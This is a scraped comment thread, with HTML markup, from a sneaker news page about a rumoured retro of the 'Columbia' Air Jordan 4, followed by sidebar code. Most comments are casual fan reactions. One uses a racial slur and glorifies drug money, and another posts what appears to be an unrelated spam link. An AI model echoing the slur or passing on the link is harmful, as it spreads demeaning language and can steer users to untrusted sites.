    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/26/f2ce9cf93732d8a88087a0afe3605c53/50.jpg?v=1417774549" class=
    "fyre-user-avatar" alt="David Miranda" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">David Miranda</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Jose Grimaldo cant wait for these bro lol sickkkk</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/26/d035d03703d1d27afe02db92860d1ecb/50.jpg?v=1415840599" class=
    "fyre-user-avatar" alt="Silvestre BM" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Silvestre BM</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Who cares. Resellers gonna buy 'em up as usual to sell as "Drug Money".</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/3810445957226c2f86ddf2de3c682182/50.jpg?v=1401940974" class=
    "fyre-user-avatar" alt="BKKASHMAN" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">BKKASHMAN</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:602392836" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/NYCyg" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">NYCyg</span></a></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/e8c175cac34ff6014f314dd2f4af070e/50.jpg?v=1401940962" class=
    "fyre-user-avatar" alt="ALVINFABULOSO" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">ALVINFABULOSO</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p>WOWOWOWOWOWOWOW✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨✨
“<a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a> "Columbia" Jordan 4s are coming back <a href="http://t.co/6Hbf29kJyA" target="_blank" rel="nofollow" class="external">dlvr.it/5tTZmb</a> <a href="http://t.co/yC09N98oEa" target="_blank" rel="nofollow" class="external">pic.twitter.com/yC09N98oEa</a>”</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/424dd5f055c2d40291049f5be4718c5a/50.jpg?v=1418429043" class=
    "fyre-user-avatar" alt="Nando21_XO" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Nando21_XO</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p>“<a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a>: "Columbia" Jordan 4s are coming back <a href="http://t.co/ZjcMfcMrUa" target="_blank" rel="nofollow" class="external">dlvr.it/5tTZmb</a> <a href="http://t.co/sIZ3SYpt5b" target="_blank" rel="nofollow" class="external">pic.twitter.com/sIZ3SYpt5b</a>”beautiful</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/26/5184344986ff1bfb0af61028b65d52cf/50.jpg?v=1419477249" class=
    "fyre-user-avatar" alt="Anthony Mitchell" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Anthony Mitchell</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>these and oreos!!! i need the oreos more tho</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/26/bc08e09e860406a8715b3514f800ec56/50.jpg?v=1404255714" class=
    "fyre-user-avatar" alt="Serg Laurence" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Serg Laurence</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Ruin one of the best colorways with bad materials...........allllllriggghhttyyy then JB</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://gravatar.com/avatar/b1ce862434f86f13f66353ca210b44c2/?s=50&amp;d=http://avatars.fyre.co/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="ConorAndrich2468" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">ConorAndrich2468</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Finally! The Retro + series had some of the best colorways, so I'm glad to be seeing them again.</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/02a5fea45a450516391b80a01e52a238/50.jpg?v=1416843981" class=
    "fyre-user-avatar" alt="Cop em and Rock em" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Cop em and Rock em</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>These both need the netting. IMO. But I'm a bigggg fan of the iv's. Just doesn't look right without the netting. Bottom line!</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/1d40fd8cb3f5e99470a8fba08e15f2b0/50.jpg" class=
    "fyre-user-avatar" alt="&quot;C.E.O.&quot;" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">&quot;C.E.O.&quot;</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Man, could you imagine if Jordan brand decided to unexpectedly drop these with the AJ XI "Columbia"? (AJ XI "Pantone" also a rumor) Pure DEVASTATION. <br/></p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/809d49a5bb48209a92264f8049c012b5/50.jpg?v=1401937292" class=
    "fyre-user-avatar" alt="keifcheif1" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">keifcheif1</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a> oh shit droppin bombs columbia</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://gravatar.com/avatar/44f084e599a158f3b8184e6018c22e77/?s=50&amp;d=http://avatars.fyre.co/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="Naptowns Finest" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Naptowns Finest</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>now this is heat must cop </p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/30b92bd1c8007aed3af49a145ddca9da/50.jpg?v=1399740820" class=
    "fyre-user-avatar" alt="datdudeeric33" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">datdudeeric33</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a> worddddd</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/4fb905302e5ba33c098645aaf4f1596e/50.jpg?v=1398081818" class=
    "fyre-user-avatar" alt="macksvolume" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">macksvolume</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Yeah the Oreos for 2015 to huh but they don't hav the net mesh on side an n front of tongue I personally like the net mesh on the 4s(wings) easy pass for me</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/b390be7cf2858849c681ed1711ee9bdd/50.jpg?v=1402032913" class=
    "fyre-user-avatar" alt="RJujahau" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">RJujahau</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:32768584" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/CYB_Mitch" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">CYB_Mitch</span></a> <a href="http://t.co/XNFvplOALd" target="_blank" rel="nofollow" class="external">swe.peeinthesnow.com/Pzjjl</a> <a href="https://twitter.com/#!/search/realtime/%23with" class="fyre-hashtag external" hashtag="with" rel="tag" target="_blank">#with</a></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://gravatar.com/avatar/77c1db7e2a9673445be9dceb7f4b582e/?s=50&amp;d=http://avatars.fyre.co/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="maxbags" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">maxbags</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>shutr your mouth moron, this shits fresh wjite t blu levis, oreos black t black levis cant lose.... benn wanting these!!</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/f1d9ac79e65c5dd2c970af9d98c27bf8/50.jpg?v=1414843337" class=
    "fyre-user-avatar" alt="tyroneblank_" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">tyroneblank_</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:2207967418" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/Royalty_Devon" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">Royalty_Devon</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a> they prolly wouldn't drop the OG model. Just the colorway,</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://gravatar.com/avatar/77c1db7e2a9673445be9dceb7f4b582e/?s=50&amp;d=http://avatars.fyre.co/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="maxbags" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">maxbags</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>yeah and us whoi got "drug money" will spend it up!! quit crying because you broke, just bask in it when you see a real niggah hgit the block tough in these real "drug dealer" style</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://gravatar.com/avatar/77c1db7e2a9673445be9dceb7f4b582e/?s=50&amp;d=http://avatars.fyre.co/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="maxbags" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">maxbags</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>i hope not!! hopefyully look just as old pic....now im kind scared see what happens???columbia with crappy materials????even worse then them not re releasing....goood point man</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/bdb1028e147f8e1af761fe6e641345c7/50.jpg?v=1395675077" class=
    "fyre-user-avatar" alt="inTheNameofQuen" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">inTheNameofQuen</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>The ones from 99 didn't have that either</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://gravatar.com/avatar/77c1db7e2a9673445be9dceb7f4b582e/?s=50&amp;d=http://avatars.fyre.co/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="maxbags" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">maxbags</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>@tyroneblank_ <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:2207967418" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/Royalty_Devon" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">Royalty_Devon</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a> side netting is poop preforated leatrher way more high end. just wait until my versace year of the snake 4s hit sneakernews!! beswt 4s in the whole world trust</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/4fb905302e5ba33c098645aaf4f1596e/50.jpg?v=1398081818" class=
    "fyre-user-avatar" alt="macksvolume" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">macksvolume</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Nah they didn't but they look funny to me without the net mesh like those champagne jordans I mean som shiny green jordans jordan brand is starting to flake out</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
      </div>
    </div>
  </div>
</div>
</div>
                            </div><!-- left-main -->
            <!--side-bar-->
            <div class="right-main">
    <section class="right-data-con omc-right" id="omc-sidebar">
        <ul class="xoxo">
			<!-- cmnUNT | Begin ad tag -->
			<script type="text/javascript">cmnUNT('300x250', tile_num++);</script> 
			<!-- cmnUNT | End ad tag -->
			<br><br>
		

		<!--<li class="instagram omc-widget">
			
						
			<header class="hero">
				<h2><span class="logo"></span></h2>
				<a href="http://instagram.com/sneakernews" target="_blank" class="external"><span>@</span>sneakernews</a>
				<h2><span> Followers</span></h2>
			</header>
			
						
		</li>-->		   
		</ul><!-- /xoxo -->
    </section>

    <section class="right-data-con">
        <div class="follow-us-box">
            <h3><span>follow us:</span></h3>

            <ul class="social-link">
                <li><a class="facebook" href="https://www.facebook.com/sneakernews"></a></li>                <li><a class="instagram" href="http://instagram.com/sneakernews"></a></li>                <li><a class="twitter" href="https://twitter.com/sneakernews/"></a></li>                <li><a class="pinterest" href="http://pinterest.com/sneakernews/"></a></li>                <li><a class="google" href="https://plus.google.com/+sneakernews/about"></a></li>            </ul>
            <div id="fb-root"></div>
            <script>(function(d, s, id) {
                    var js, fjs = d.getElementsByTagName(s)[0];
                    if (d.getElementById(id))
                        return;
                    js = d.createElement(s);
                    js.id = id;
                    js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.0";
                    fjs.parentNode.insertBefore(js, fjs);
                }(document, 'script', 'facebook-jssdk'));</script>
            <div class="fb-like" data-href="https://www.facebook.com/sneakernews" data-layout="standard" data-action="like" data-show-faces="false" data-share="false" width="300px"></div>
        </div>
    </section>

    <section class="right-data-con top-categories">
        <!-- AVH Extended Categories version 3.6.7 | http://blog.avirtualhome.com/wordpress-plugins/ --><h3><span>Top Categories</span></h3><ul><div id='cat-drop'><select name='cat' id='cat' class='postform' >
	<option value='-1'>Select Category</option>
	<option class="level-0" value="24">Adidas&nbsp;&nbsp;(4,205)</option>
	<option class="level-0" value="20">Air Classic BW&nbsp;&nbsp;(208)</option>
	<option class="level-0" value="12">Air Jordan&nbsp;&nbsp;(10,480)</option>
	<option class="level-0" value="206">Air Jordan Force Fusion&nbsp;&nbsp;(235)</option>
	<option class="level-0" value="15">Air Max 1&nbsp;&nbsp;(1,194)</option>
	<option class="level-0" value="9">Air Max 360&nbsp;&nbsp;(86)</option>
	<option class="level-0" value="6">Air Max 90&nbsp;&nbsp;(1,260)</option>
	<option class="level-0" value="19">Air Max 95&nbsp;&nbsp;(525)</option>
	<option class="level-0" value="47">Air Max 97&nbsp;&nbsp;(172)</option>
	<option class="level-0" value="57">Air Max Light&nbsp;&nbsp;(150)</option>
	<option class="level-0" value="41">Air Stab&nbsp;&nbsp;(31)</option>
	<option class="level-0" value="68">Air Structure&nbsp;&nbsp;(79)</option>
	<option class="level-0" value="273">Air Yeezy&nbsp;&nbsp;(325)</option>
	<option class="level-0" value="44">Alife&nbsp;&nbsp;(108)</option>
	<option class="level-0" value="39">Asia Exclusive&nbsp;&nbsp;(495)</option>
	<option class="level-0" value="42">Asics&nbsp;&nbsp;(835)</option>
	<option class="level-0" value="27">Bape&nbsp;&nbsp;(85)</option>
	<option class="level-0" value="21">Basketball&nbsp;&nbsp;(8,058)</option>
	<option class="level-0" value="4">Blazer&nbsp;&nbsp;(959)</option>
	<option class="level-0" value="272">Celebrity Feet&nbsp;&nbsp;(1,864)</option>
	<option class="level-0" value="16">Clothing&nbsp;&nbsp;(350)</option>
	<option class="level-0" value="43">Collaboration&nbsp;&nbsp;(6,518)</option>
	<option class="level-0" value="271">Collections&nbsp;&nbsp;(226)</option>
	<option class="level-0" value="70">Converse&nbsp;&nbsp;(1,043)</option>
	<option class="level-0" value="25">Court Force&nbsp;&nbsp;(104)</option>
